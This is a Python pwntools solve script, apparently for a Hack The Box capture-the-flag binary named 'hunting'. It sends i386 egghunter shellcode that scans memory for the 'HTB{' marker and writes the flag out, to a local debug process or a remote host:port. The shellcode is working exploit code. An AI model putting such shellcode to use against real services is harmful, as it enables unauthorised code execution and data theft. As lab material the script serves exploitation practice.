#!/usr/bin/env python3

from pwn import *


context.arch = "i386"

def exploit(io):
    egg = int.from_bytes(b"HTB{", "little")
    shellcode = asm(f"""
                mov ebx, 0xff
                mov eax, 0x1b
                int 0x80

                mov edi, {hex(egg)}
                mov edx, 0x60000000

                next_page:
                    add edx, 0x1000
                
                scan_loop:
                    pusha

                    xor ecx, ecx
                    lea ebx, [edx + 0x4]
                    mov al, 0x21
                    int 0x80
                    
                    cmp al, 0xf2
                    popa
                    jz next_page

                    cmp [edx], edi
                    jnz scan_loop

                mov ecx, edx
                push 0x24
                pop edx
                push 0x1
                pop ebx
                mov al, 0x4
                int 0x80
                """)

    io.send(shellcode)
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./hunting")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)
    exploit(io)

if __name__ == "__main__":
    main()



